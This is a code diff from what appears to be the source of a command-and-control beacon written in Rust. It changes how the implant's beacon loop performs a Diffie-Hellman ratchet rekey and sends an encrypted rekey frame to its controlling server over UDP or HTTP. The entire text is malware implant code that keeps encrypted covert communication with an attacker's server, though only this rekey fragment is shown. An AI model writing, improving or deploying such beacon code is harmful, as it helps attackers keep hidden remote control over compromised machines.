@@ -814,29 +814,31 @@ pub fn run_beacon_loop(_initial_config: C2Config) -> ! {
 
             // Check if rekey is needed
             if packet_count >= 1_000_000 || last_rekey >= rekey_interval {
-                session.rekey_dh();
-                packet_count = 0;
-                last_rekey = 0;
+                // Force a DH ratchet step if we have sent messages since the last one
+                if session.rekey_dh().is_ok() {
+                    packet_count = 0;
+                    last_rekey = 0;
 
-                // Send explicit rekey frame (Strategy 1: Dedicated Protocol Message)
-                // The actual new key is carried in the Double Ratchet header of this encrypted message
-                let rekey_frame = WraithFrame::new(packet::FRAME_REKEY_DH, Vec::new());
-                if let Ok(msg) = session.write_message(&rekey_frame.serialize()) {
-                    let transport: &mut dyn Transport = if use_udp {
-                        &mut udp_transport
-                    } else {
-                        &mut http_transport
-                    };
-                    // We expect the server to respond (potentially with its own new key in the header)
-                    if let Ok(resp) = transport.request(&msg) {
-                        // Process response to advance ratchet
-                        if session.read_message(&resp).is_ok() {
-                            failures = 0;
+                    // Send explicit rekey frame (Strategy 1: Dedicated Protocol Message)
+                    // The actual new key is carried in the Double Ratchet header of this encrypted message
+                    let rekey_frame = WraithFrame::new(packet::FRAME_REKEY_DH, Vec::new());
+                    if let Ok(msg) = session.write_message(&rekey_frame.serialize()) {
+                        let transport: &mut dyn Transport = if use_udp {
+                            &mut udp_transport
+                        } else {
+                            &mut http_transport
+                        };
+                        // We expect the server to respond (potentially with its own new key in the header)
+                        if let Ok(resp) = transport.request(&msg) {
+                            // Process response to advance ratchet
+                            if session.read_message(&resp).is_ok() {
+                                failures = 0;
+                            } else {
+                                failures += 1;
+                            }
                         } else {
                             failures += 1;
                         }
-                    } else {
-                        failures += 1;
                     }
                 }
             }
